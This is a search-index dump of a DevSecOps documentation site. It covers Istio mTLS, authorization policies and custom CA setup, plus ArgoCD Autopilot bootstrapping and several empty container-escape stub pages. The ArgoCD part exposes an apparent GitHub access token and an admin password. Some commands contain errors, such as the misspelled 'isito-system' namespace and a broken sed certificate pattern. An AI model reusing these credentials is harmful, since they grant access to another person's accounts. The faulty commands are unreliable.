Data plane Sidecar and ingress/egress proxies work as Policy Enforcement Points. The certificate, keys, authentications, authorization, and secure naming policies are sent to these proxies at all times. This means every point has security checks, not just the entry point to the network, and this is called security at depth.","title":"Istio Security Architecture"},{"location":"content/en/docs/devops/devops-istio/#authentication","text":"In service-oriented architecture, we need to make sure that communication between two services are authenticated.Meaning, when a service tries to communicate with another service, there should be a way to confirm they're really who they say they are. This is done by hardening traffic using verification options like mutual TLS and JSON Web Token validation. For example, when the productpage service tries to reach the reviews service, the reviews services needs to know that the request is actually coming from the productpage service and not from an external source who pretends to be the productpage service, so the traffic between one service to the other needs to be verified. With mTLS, each service gets its own identity Peer Authentication , which is enforced using certificate key pairs. This certificate generation and distribution are all managed automatically by istiod . So there's nothing extra that you have to do on the services. Another area to be authenticated is the end users' access to services. For this, Istio supports Request Authentication using JSON Web Token validation or OpenID Connect providers some of which are: ORY Hydra Keycloak Firebase Google Example for Peer Authentication config, this policy in the book-info namespace and only be effective on workloads labeled with the key app and value set to reviews, and say that these workloads must strictly use Mutual TLS. In this case, we have enabled authentication only for the reviews app, and so we have only enabled it for a single workload. This is a workload-specific policy. cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: peer-policy namespace: book-info spec: selector: matchLabels: app: reviews # only effective on workload with this label mtls: mode: STRICT # strictly use Mutual TLS EOF If you remove the selector specification, the policy will be enabled for the entire namespace, so then this would be a namespace-wide policy that is applied to all workloads within the book-info namespace cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: peer-policy namespace: book-info spec: mtls: mode: STRICT # strictly use Mutual TLS for entire namespace EOF If we set the namespace to the root namespace istio-system so then this become a mesh-wide policy that is applicable to the entire mesh. cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: peer-policy namespace: isito-system # this is the mesh-wide policy spec: mtls: mode: STRICT EOF If your namespace is not injection enabled, you still can manual inject Istio proxy sidecars to deployment, but manual injection will change the deployment configuration by adding proxy configuration into it. So it works a little differently. # Update resources on the fly before applying. kubectl apply -f < ( istioctl kube-inject -f <resource.yaml> ) # Create a persistent version of the deployment with Istio sidecar injected. istioctl kube-inject -f deployment.yaml -o deployment-injected.yaml # Update an existing deployment. kubectl get deployment -o yaml | istioctl kube-inject -f - | kubectl apply -f - Demo Peer Authentication, workloads that do not apply the same mode cannot reach our application. Create new namespace bar kubectl create ns bar The output is similar to this: namespace/bar created Manual inject Istio proxy sidecars into HTTPbin deployment and deploy kubectl apply -f < ( istioctl kube-inject -f samples/httpbin/httpbin.yaml ) -n bar The output is similar to this: serviceaccount/httpbin created service/httpbin created deployment.apps/httpbin created Curl from HTTPbin to the productpage kubectl exec -it \" $( kubectl get pod -l app = httpbin -n bar -o jsonpath ={ .items..metadata.name } ) \" -c istio-proxy -n bar -- curl \"http://productpage.default:9080\" -s -o /dev/null -w \"%{http_code}\\n\" The output is similar to this: 200 Apply the Peer Authentication for default namespace mTLS mode strict cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: peer-policy namespace: default spec: mtls: mode: STRICT EOF The output is similar to this: peerauthentication.security.istio.io/peer-policy created Curl from HTTPbin to the productpage again kubectl exec -it \" $( kubectl get pod -l app = httpbin -n bar -o jsonpath ={ .items..metadata.name } ) \" -c istio-proxy -n bar -- curl \"http://productpage.default:9080\" -s -o /dev/null -w \"%{http_code}\\n\" The output is similar to this: 000 command terminated with exit code 56","title":"Authentication"},{"location":"content/en/docs/devops/devops-istio/#authorization","text":"Authorization in Istio provides a flexible approach to access control for inbound traffic. We can control which service can reach which service, which is referred to as east-west traffic using authorization configuration. With authentication policies, we now have the end-user traffic as well as service-to-service traffic secured. What about access control? For example, we would like to only allow the productpage service to access the reviews service and not the details or any other services. Also, the productpage service is only supposed to run GET calls to reviews service and not POST or UPDATE calls. We do not want anyone gaining access to the productpage service to make POST calls to the reviews service in an attempt to update or change reviews. And for this purpose, Istio provides authorization mechanisms that allow us to define policies to allow or deny requests based on certain criteria. These services don't require any changes to implement authorization. This is implemented by Envoy proxies authorization engine in runtime. When a request comes through the proxy, the authorization engine evaluates the request context against the current authorization policies and returns the authorization result either allow or deny. There are 4 actions that authorization policies support, CUSTOM, DENY, ALLOW, and AUDIT: ALLOW action allows a request to go through. DENY action denies a request from going through. CUSTION action allows an extension to handle the request. AUDIT action - Authorization policies can also be configured to audit requests. With this option, when a request hits the matching rule, it gets audited. Example of an authorization policy: cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: AuthorizationPolicy metadata: name: authdenypolicy namespace: bookinfo spec: action: DENY # this policy deines all POST requests from the bar namespace to the bookinfo namespace rules: - from: - source: namespace: [\"bar\"] to: - operation: methods: [\"POST\"] EOF","title":"Authorization"},{"location":"content/en/docs/devops/devops-istio/#certificate-management","text":"This is a diagram of key and certification flow in Istio, so when a service is started, it needs to identify itself to the mesh control plane and retrieve a certificate in order to serve traffic. Istio only has a built-in certificate authority. The Istio agent in a service creates a private key and a certificate signing request, and then sends the certificate signing request with its credentials to istiod for signing. The CA in istiod validates the credentials carried in the CSR. Upon successful validation, it signs the CSR to generate the certificate. The Istio agent sends the certificates received from istiod and the private key to Envoy proxy Istio agent monitors the expiration of the workload certificate. The above process repeats periodically for certificates and key rotation. It is important to note that for production-grade clusters, you should use a production-ready CA such as HashiCorp Vault and put your certificates in an oven machine or the fridge. Create our own root certificate cd ~/DevSecOps/demo/istio/istio-1.14.1 mkdir ca-certs cd ca-certs make -f ../tools/certs/Makefile.selfsigned.mk root-ca The output is similar to this: generating root-key.pem Generating RSA private key, 4096 bit long modulus .................++ ...................................................................................................................................................................................................................++ e is 65537 ( 0x10001 ) generating root-cert.csr generating root-cert.pem Signature ok subject = /O = Istio/CN = Root CA Getting Private key Here are 4 files that are generated with above command ls The output is similar to this: root-ca.conf root-cert.csr root-cert.pem root-key.pem root-ca.conf is the configuration for OpenSSL to generate the root certificate. root-cert.csr is a generated CSR for the root certificate. root-cert.pem is a generated root certificate. root-key.pem is a generated root key. Now we will create our immediate certificates. make -f ../tools/certs/Makefile.selfsigned.mk localcluster-cacerts The output is similar to this: generating localcluster/ca-key.pem Generating RSA private key, 4096 bit long modulus ........................................................................................................................................................................................................................................................................................................................++ .++ e is 65537 ( 0x10001 ) generating localcluster/cluster-ca.csr generating localcluster/ca-cert.pem Signature ok subject = /O = Istio/CN = Intermediate CA/L = localcluster Getting CA Private Key generating localcluster/cert-chain.pem Intermediate inputs stored in localcluster/ done rm localcluster/cluster-ca.csr localcluster/intermediate.conf Root certificates should not be used directly, because it is very dangerous, and also not very practical to use them. Above they are also created cd localcluster ls The output is similar to this: ca-cert.pem ca-key.pem cert-chain.pem root-cert.pem Important: you need to delete if you pre-installed Istio, or at least delete the istio-system namespace to configure Istio to use our certificate. kubeclt delete ns istio-system The output is similar to this: namespace \"istio-system\" deleted Then you can as well start with a fresh cluster cd ../../ ./samples/bookinfo/platform/kube/cleanup.sh The output is similar to this: namespace ? [ default ] using NAMESPACE = default destinationrule.networking.istio.io \"details\" deleted destinationrule.networking.istio.io \"productpage\" deleted destinationrule.networking.istio.io \"ratings\" deleted destinationrule.networking.istio.io \"reviews\" deleted virtualservice.networking.istio.io \"bookinfo\" deleted gateway.networking.istio.io \"bookinfo-gateway\" deleted Application cleanup may take up to one minute service \"details\" deleted serviceaccount \"bookinfo-details\" deleted deployment.apps \"details-v1\" deleted service \"ratings\" deleted serviceaccount \"bookinfo-ratings\" deleted deployment.apps \"ratings-v1\" deleted service \"reviews\" deleted serviceaccount \"bookinfo-reviews\" deleted deployment.apps \"reviews-v1\" deleted deployment.apps \"reviews-v2\" deleted deployment.apps \"reviews-v3\" deleted service \"productpage\" deleted serviceaccount \"bookinfo-productpage\" deleted deployment.apps \"productpage-v1\" deleted Application cleanup successful Now let's create istio-system namespace again kubectl create ns istio-system The output is similar to this: namespace/istio-system created Then create a secret to include all these certificates cd ca-certs/localcluster/ kubectl create secret generic cacerts -n istio-system \\ --from-file = ca-cert.pem \\ --from-file = ca-key.pem \\ --from-file = root-cert.pem \\ --from-file = cert-chain.pem The output is similar to this: secret/cacerts created Here, we'll install Istio back again, so that Istio certificate authority will read the certificates and key from the secret mount files. istioctl install --set profile = demo The output is similar to this: We can also get our Kiali, Grafana, Prometheus all back cd ../../ kubectl apply -f samples/addons The output is similar to this: serviceaccount/grafana created configmap/grafana created service/grafana created deployment.apps/grafana created configmap/istio-grafana-dashboards created configmap/istio-services-grafana-dashboards created deployment.apps/jaeger created service/tracing created service/zipkin created service/jaeger-collector created serviceaccount/kiali created configmap/kiali created clusterrole.rbac.authorization.k8s.io/kiali-viewer created clusterrole.rbac.authorization.k8s.io/kiali created clusterrolebinding.rbac.authorization.k8s.io/kiali created role.rbac.authorization.k8s.io/kiali-controlplane created rolebinding.rbac.authorization.k8s.io/kiali-controlplane created service/kiali created deployment.apps/kiali created serviceaccount/prometheus created configmap/prometheus created clusterrole.rbac.authorization.k8s.io/prometheus created clusterrolebinding.rbac.authorization.k8s.io/prometheus created service/prometheus created deployment.apps/prometheus created Deploy the sample booking deployment kubectl apply -f istio-1.14.1/samples/bookinfo/platform/kube/bookinfo.yaml The output is similar to this: service/details created serviceaccount/bookinfo-details created deployment.apps/details-v1 created service/ratings created serviceaccount/bookinfo-ratings created deployment.apps/ratings-v1 created service/reviews created serviceaccount/bookinfo-reviews created deployment.apps/reviews-v1 created deployment.apps/reviews-v2 created deployment.apps/reviews-v3 created service/productpage created serviceaccount/bookinfo-productpage created deployment.apps/productpage-v1 created Create a Gateway and its virtual service kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml The output is similar to this: gateway.networking.istio.io/bookinfo-gateway created virtualservice.networking.istio.io/bookinfo created Create destination rules kubectl apply -f samples/bookinfo/networking/destination-rule-all.yaml The output is similar to this: destinationrule.networking.istio.io/productpage created destinationrule.networking.istio.io/reviews created destinationrule.networking.istio.io/ratings created destinationrule.networking.istio.io/details created Check/analyze Istio istioctl analyze The output is similar to this: \u2714 No validation issues found when analyzing namespace: default Now, let's deploy a policy for our workloads to only accept mTLS traffic, strict mode here identifies that. cat <<EOF | kubectl apply -f - apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: name: default spec: mtls: mode: STRICT EOF The output is similar to this: peerauthentication.security.istio.io/default created Now, we will check if the workloads are signed with the exact same certificate that we just plugged in. When we're trying to connect the productpage kubectl exec \" $( kubectl get pod -l app = details -o jsonpath ={ .items..metadata.name } ) \" -c istio-proxy -- openssl s_client -showcerts -connect productpage:9080 > httpbin-proxy-cert.txt The output is similar to this: depth = 2 O = Istio, CN = Root CA verify error:num = 19 :self signed certificate in certificate chain DONE As the CA certificate used in this example is self-signed, the verify error:num=19:self signed certificate in certificate chain error returned by the openssl command is expected Now, here in the TXT file we have the certificates and we'll clear the rest of the certificate details with the sed command. sed -ne '/-----BEIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' httpbin-proxy-cert.txt | sed 's/^\\s*//' > certs.pem Let's check the certs.pem to see the certificates extracted from the traffic between 2 services. cat certs.pem Now, with split , we can split these into 4 different files. split -p \"-----BEGIN CERTIFICATE-----\" certs.pem proxy-cert- Now, we will verify if the root certificate is the same as the one we specified. openssl x509 -in ca-certs/localcluster/root-cert.pem -text -noout > /tmp/root-cert.crt.txt The second command will dump certificate information of the one we just extracted from the traffic itself. openssl x509 -in ./proxy-cert-3.pem -text -noout > /tmp/pod-root-cert.crt.txt Let's check if these match diff -s /tmp/root-cert.crt.txt /tmp/pod-root-cert.crt.txt The output is similar to this: Files /tmp/root-cert.crt.txt and /tmp/pod-root-cert.crt.txt are identical Same to verify the CA certificate is the same openssl x509 -in ca-certs/localcluster/ca-cert.pem -text -noout > /tmp/ca-cert.crt.txt openssl x509 -in ./proxy-cert-2.pem -text -noout > /tmp/pod-cert-chain-ca.crt.txt diff -s /tmp/ca-cert.crt.txt /tmp/pod-cert-chain-ca.crt.txt The output is similar to this: Files /tmp/ca-cert.crt.txt and /tmp/pod-cert-chain-ca.crt.txt are identical Let's also verify the certificate chain from the root certificate to the workload certificate. openssl verify -CAfile < ( cat ca-certs/localcluster/ca-cert.pem ca-certs/localcluster/root-cert.pem ) ./proxy-cert-1.pem The output is similar to this: ./proxy-cert-1.pem OK","title":"Certificate Management"},{"location":"content/en/docs/devops/devops-istio/#observability","text":"How to collect and customize telemetry information from our mesh. Istio has advantage in terms of observability because all of the traffic is handled by Envoy proxies in the data plane. Your service mesh will generate very detailed telemetry information for all service comminications with Istio. Without having to develop a solution you can have observability of services to troubleshoot and optimize the applications. Visualizing Metrics with Prometheus and Grafana Distributed Tracing with Jaeger Kiali in Detail","title":"Observability"},{"location":"content/en/docs/devops/devops-istio/#visualizing-metrics-with-prometheus-and-grafana","text":"The standard Istio metrics are exported to Prometheus by default. Prometheus is a modern monitoring tool to gather metrics for distributed architechtures and it is used by many applications and the underlying tools to collect and store metrics. By integrating your service mesh data, you will have a nice unified approach to monitoring metrics. Then, as an Istio addon your metrics can be monitored in Grafana, which is an open-source visualization and analytics tool. Demo the Prometheus dashboard and explore some metrics. Open the Prometheus dashboard istioctl dashboard prometheus Prometheus is not intended for graphical representation of metrics data. Grafana can be used for that. And here we have the Alerts, Graph, and Status tab istio_requests_total metric holds the total number of requests that are coming. istio_requests_total{destination_service=\"productpage.default.svc.cluster.local\"} Open the Grafana dashboard istioctl dashboard grafana In Grafana, you can see Search, Create, Dashboard, Explore, Alerting, and Configuration Menu","title":"Visualizing Metrics with Prometheus and Grafana"},{"location":"content/en/docs/devops/devops-istio/#distributed-tracing-with-jaeger","text":"A way to monitor and understand behavior of services, is to monitor individual requests as a flow through a mesh, which is called distributed tracing. Service dependencies and the sources of latency within the service mesh can be observed by tracing. Istio enables distributed tracing through Envoy proxies and supports Zipkin, Lightstep, Jaeger and Datadog. Demo Distriuted Tracing with Jaeger Open the Jaeger dashboard istioctl dashboard jaeger In Jaeger, we can filter services by name, by operation name, by some tags and traces, by duration of traces, and the number of results.","title":"Distributed Tracing with Jaeger"},{"location":"content/en/docs/devops/devops-istio/#kiali-in-more-detail","text":"Overview Overview gives us a summary of our mesh, the workloads, and the services. And all these can be broken down by: Health mTLS status Namespace Label We can also get the Health information for: Apps Workloads Services Graph Graph will have a very informative and clear visualization of the traffic between our services. The Graph has different versions: App graph Service graph Versioned app graph Worklaod graph These versions provide different focus views on our app by grouping accordingly. The left bottom part hels us modify the graph view On the Display, we can add more information and formating from our data plane to the graph.","title":"Kiali in more detail"},{"location":"content/en/docs/devops/devops-istio/#a-quick-note-on-service-mesh-interface","text":"While Service Mesh technologies are getting more and more polular, Service Mesh vendors keep providing new features. This is both exciting and scary at the same time because while application developers enjoy using these features, they may be locked into a vendor-specific implementation. So in 2019, Microsoft has announced their onging work on Service Mesh Interface. The main goal was to create an abstraction layer on various types of service meshes implementations, which will create a standard interface, a basic feature set, and community to drive innovation effort on Service Mesh technologies. So developers will not spend a lot of time trying to understand different features that a service mesh offers using this set of functionality, and they will be able to jump in and start using any product. 10 Service Mesh providers so far have implemented the common standards, Istio being on of them. You can find a total list of providers in SMI SPEC in smi-spec.io. So the Service Mesh Interface will be covering traffic policy, traffic telemetry, and traffic management topics while also providing portability and flexibility. SMI APIs are expected to mature over time and the current capabilities will definitely extend.","title":"A QUICK NOTE ON SERVICE MESH INTERFACE"},{"location":"content/en/docs/devops/devops-istio/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/devops/devops-kubernetes-deployment-antipatterns/","tags":["kubernetes","k8s","deployment","antipattern"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Devops kubernetes deployment antipatterns"},{"location":"content/en/docs/devops/devops-kubernetes-deployment-antipatterns/#overview","text":"","title":"Overview"},{"location":"content/en/docs/devops/devops-kubernetes-deployment-antipatterns/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/devops/devops-kubernetes-deployment-antipatterns/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/devops/devops-kubernetes-deployment-antipatterns/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/devops/devops-kubernetes-deployment-antipatterns/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/devops/devops-kubernetes-deployment-antipatterns/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/devops/devops-kubernetes/","tags":["kubernetes","k8s"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Devops kubernetes"},{"location":"content/en/docs/devops/devops-kubernetes/#overview","text":"","title":"Overview"},{"location":"content/en/docs/devops/devops-kubernetes/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/devops/devops-kubernetes/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/devops/devops-kubernetes/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/devops/devops-kubernetes/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/devops/devops-kubernetes/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/devops/devops-tools-list/","tags":["Tools"],"text":"DevOps Tools List \u00b6 Workflow \u00b6 Istio GitHub Actions Jenkins Prometheus Ansible Chef Terraform JAMStack ELKStack Kubewatch Kubetail Whatsnext \u00b6","title":"DevOps Tools List"},{"location":"content/en/docs/devops/devops-tools-list/#devops-tools-list","text":"","title":"DevOps Tools List"},{"location":"content/en/docs/devops/devops-tools-list/#workflow","text":"Istio GitHub Actions Jenkins Prometheus Ansible Chef Terraform JAMStack ELKStack Kubewatch Kubetail","title":"Workflow"},{"location":"content/en/docs/devops/devops-tools-list/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/gitops/gitops-argocd/","tags":["ArgoCD"],"text":"ArgoCD \u00b6 Install ArgoCD with Autopilot \u00b6 Git Authentication \u00b6 export GIT_TOKEN = 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 Export Clone URL \u00b6 export GIT_REPO = https://github.com/nhamchanvi/bic-gitops Set up the GitOps Repository \u00b6 argocd-autopilot repo bootstrap The output is similar to this: INFO cloning repo: https://github.com/nhamchanvi/bic-gitops.git WARNING --provider not specified, assuming provider from url: github INFO empty repository, initializing a new one with specified remote INFO using revision: \"\" , installation path: \"\" INFO using context: \"do-k8s-sbx-istio\" , namespace: \"argocd\" INFO applying bootstrap manifests to cluster... namespace/argocd created customresourcedefinition.apiextensions.k8s.io/applications.argoproj.io unchanged customresourcedefinition.apiextensions.k8s.io/applicationsets.argoproj.io unchanged customresourcedefinition.apiextensions.k8s.io/appprojects.argoproj.io unchanged serviceaccount/argocd-application-controller created serviceaccount/argocd-applicationset-controller created serviceaccount/argocd-dex-server created serviceaccount/argocd-notifications-controller created serviceaccount/argocd-redis created serviceaccount/argocd-repo-server created serviceaccount/argocd-server created role.rbac.authorization.k8s.io/argocd-application-controller created role.rbac.authorization.k8s.io/argocd-applicationset-controller created role.rbac.authorization.k8s.io/argocd-dex-server created role.rbac.authorization.k8s.io/argocd-notifications-controller created role.rbac.authorization.k8s.io/argocd-server created clusterrole.rbac.authorization.k8s.io/argocd-application-controller unchanged clusterrole.rbac.authorization.k8s.io/argocd-server unchanged rolebinding.rbac.authorization.k8s.io/argocd-application-controller created rolebinding.rbac.authorization.k8s.io/argocd-applicationset-controller created rolebinding.rbac.authorization.k8s.io/argocd-dex-server created rolebinding.rbac.authorization.k8s.io/argocd-notifications-controller created rolebinding.rbac.authorization.k8s.io/argocd-redis created rolebinding.rbac.authorization.k8s.io/argocd-server created clusterrolebinding.rbac.authorization.k8s.io/argocd-application-controller unchanged clusterrolebinding.rbac.authorization.k8s.io/argocd-server unchanged configmap/argocd-cm created configmap/argocd-cmd-params-cm created configmap/argocd-gpg-keys-cm created configmap/argocd-notifications-cm created configmap/argocd-rbac-cm created configmap/argocd-ssh-known-hosts-cm created configmap/argocd-tls-certs-cm created secret/argocd-notifications-secret created secret/argocd-secret created service/argocd-applicationset-controller created service/argocd-dex-server created service/argocd-metrics created service/argocd-notifications-controller-metrics created service/argocd-redis created service/argocd-repo-server created service/argocd-server created service/argocd-server-metrics created deployment.apps/argocd-applicationset-controller created deployment.apps/argocd-dex-server created deployment.apps/argocd-notifications-controller created deployment.apps/argocd-redis created deployment.apps/argocd-repo-server created deployment.apps/argocd-server created statefulset.apps/argocd-application-controller created networkpolicy.networking.k8s.io/argocd-application-controller-network-policy created networkpolicy.networking.k8s.io/argocd-dex-server-network-policy created networkpolicy.networking.k8s.io/argocd-redis-network-policy created networkpolicy.networking.k8s.io/argocd-repo-server-network-policy created networkpolicy.networking.k8s.io/argocd-server-network-policy created secret/autopilot-secret created INFO pushing bootstrap manifests to repo Resolving deltas: 100 % ( 1 /1 ) , done . INFO applying argo-cd bootstrap application application.argoproj.io/autopilot-bootstrap created INFO running argocd login to initialize argocd config 'admin:login' logged in successfully Context 'autopilot' updated INFO argocd initialized. password: uoRzYtW3RB-sPsVc INFO run: kubectl port-forward -n argocd svc/argocd-server 8080 :80","title":"ArgoCD"},{"location":"content/en/docs/gitops/gitops-argocd/#argocd","text":"","title":"ArgoCD"},{"location":"content/en/docs/gitops/gitops-argocd/#install-argocd-with-autopilot","text":"","title":"Install ArgoCD with Autopilot"},{"location":"content/en/docs/gitops/gitops-argocd/#git-authentication","text":"export GIT_TOKEN = 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","title":"Git Authentication"},{"location":"content/en/docs/gitops/gitops-argocd/#export-clone-url","text":"export GIT_REPO = https://github.com/nhamchanvi/bic-gitops","title":"Export Clone URL"},{"location":"content/en/docs/gitops/gitops-argocd/#set-up-the-gitops-repository","text":"argocd-autopilot repo bootstrap The output is similar to this: INFO cloning repo: https://github.com/nhamchanvi/bic-gitops.git WARNING --provider not specified, assuming provider from url: github INFO empty repository, initializing a new one with specified remote INFO using revision: \"\" , installation path: \"\" INFO using context: \"do-k8s-sbx-istio\" , namespace: \"argocd\" INFO applying bootstrap manifests to cluster... namespace/argocd created customresourcedefinition.apiextensions.k8s.io/applications.argoproj.io unchanged customresourcedefinition.apiextensions.k8s.io/applicationsets.argoproj.io unchanged customresourcedefinition.apiextensions.k8s.io/appprojects.argoproj.io unchanged serviceaccount/argocd-application-controller created serviceaccount/argocd-applicationset-controller created serviceaccount/argocd-dex-server created serviceaccount/argocd-notifications-controller created serviceaccount/argocd-redis created serviceaccount/argocd-repo-server created serviceaccount/argocd-server created role.rbac.authorization.k8s.io/argocd-application-controller created role.rbac.authorization.k8s.io/argocd-applicationset-controller created role.rbac.authorization.k8s.io/argocd-dex-server created role.rbac.authorization.k8s.io/argocd-notifications-controller created role.rbac.authorization.k8s.io/argocd-server created clusterrole.rbac.authorization.k8s.io/argocd-application-controller unchanged clusterrole.rbac.authorization.k8s.io/argocd-server unchanged rolebinding.rbac.authorization.k8s.io/argocd-application-controller created rolebinding.rbac.authorization.k8s.io/argocd-applicationset-controller created rolebinding.rbac.authorization.k8s.io/argocd-dex-server created rolebinding.rbac.authorization.k8s.io/argocd-notifications-controller created rolebinding.rbac.authorization.k8s.io/argocd-redis created rolebinding.rbac.authorization.k8s.io/argocd-server created clusterrolebinding.rbac.authorization.k8s.io/argocd-application-controller unchanged clusterrolebinding.rbac.authorization.k8s.io/argocd-server unchanged configmap/argocd-cm created configmap/argocd-cmd-params-cm created configmap/argocd-gpg-keys-cm created configmap/argocd-notifications-cm created configmap/argocd-rbac-cm created configmap/argocd-ssh-known-hosts-cm created configmap/argocd-tls-certs-cm created secret/argocd-notifications-secret created secret/argocd-secret created service/argocd-applicationset-controller created service/argocd-dex-server created service/argocd-metrics created service/argocd-notifications-controller-metrics created service/argocd-redis created service/argocd-repo-server created service/argocd-server created service/argocd-server-metrics created deployment.apps/argocd-applicationset-controller created deployment.apps/argocd-dex-server created deployment.apps/argocd-notifications-controller created deployment.apps/argocd-redis created deployment.apps/argocd-repo-server created deployment.apps/argocd-server created statefulset.apps/argocd-application-controller created networkpolicy.networking.k8s.io/argocd-application-controller-network-policy created networkpolicy.networking.k8s.io/argocd-dex-server-network-policy created networkpolicy.networking.k8s.io/argocd-redis-network-policy created networkpolicy.networking.k8s.io/argocd-repo-server-network-policy created networkpolicy.networking.k8s.io/argocd-server-network-policy created secret/autopilot-secret created INFO pushing bootstrap manifests to repo Resolving deltas: 100 % ( 1 /1 ) , done . INFO applying argo-cd bootstrap application application.argoproj.io/autopilot-bootstrap created INFO running argocd login to initialize argocd config 'admin:login' logged in successfully Context 'autopilot' updated INFO argocd initialized. password: uoRzYtW3RB-sPsVc INFO run: kubectl port-forward -n argocd svc/argocd-server 8080 :80","title":"Set up the GitOps Repository"},{"location":"content/en/docs/hack/docker/abusing-docker-socket-for-privilege-escalation/","tags":["linux","docker"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Abusing docker socket for privilege escalation"},{"location":"content/en/docs/hack/docker/abusing-docker-socket-for-privilege-escalation/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/docker/abusing-docker-socket-for-privilege-escalation/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/docker/abusing-docker-socket-for-privilege-escalation/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/docker/abusing-docker-socket-for-privilege-escalation/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/docker/abusing-docker-socket-for-privilege-escalation/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/docker/abusing-docker-socket-for-privilege-escalation/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/docker/apparmor/","tags":["linux","docker"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Apparmor"},{"location":"content/en/docs/hack/docker/apparmor/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/docker/apparmor/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/docker/apparmor/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/docker/apparmor/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/docker/apparmor/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/docker/apparmor/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/docker/authz-authn-docker-access-authorization-plugin/","tags":["linux","docker"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Authz authn docker access authorization plugin"},{"location":"content/en/docs/hack/docker/authz-authn-docker-access-authorization-plugin/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/docker/authz-authn-docker-access-authorization-plugin/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/docker/authz-authn-docker-access-authorization-plugin/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/docker/authz-authn-docker-access-authorization-plugin/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/docker/authz-authn-docker-access-authorization-plugin/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/docker/authz-authn-docker-access-authorization-plugin/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/docker/docker--privileged/","tags":["linux","docker"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Docker  privileged"},{"location":"content/en/docs/hack/docker/docker--privileged/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/docker/docker--privileged/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/docker/docker--privileged/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/docker/docker--privileged/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/docker/docker--privileged/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/docker/docker--privileged/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/docker/docker-release_agent-cgroups-escape/","tags":["linux","docker"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext \u00b6","title":"Docker release agent cgroups escape"},{"location":"content/en/docs/hack/docker/docker-release_agent-cgroups-escape/#overview","text":"","title":"Overview"},{"location":"content/en/docs/hack/docker/docker-release_agent-cgroups-escape/#prerequisites","text":"","title":"Prerequisites"},{"location":"content/en/docs/hack/docker/docker-release_agent-cgroups-escape/#objectives","text":"","title":"objectives"},{"location":"content/en/docs/hack/docker/docker-release_agent-cgroups-escape/#lessoncontent","text":"","title":"lessoncontent"},{"location":"content/en/docs/hack/docker/docker-release_agent-cgroups-escape/#cleanup","text":"","title":"cleanup"},{"location":"content/en/docs/hack/docker/docker-release_agent-cgroups-escape/#whatsnext","text":"","title":"Whatsnext"},{"location":"content/en/docs/hack/docker/namespaces/","tags":["linux","docker"],"text":"Overview \u00b6 Prerequisites \u00b6 objectives \u00b6 lessoncontent \u00b6 cleanup \u00b6 Whatsnext 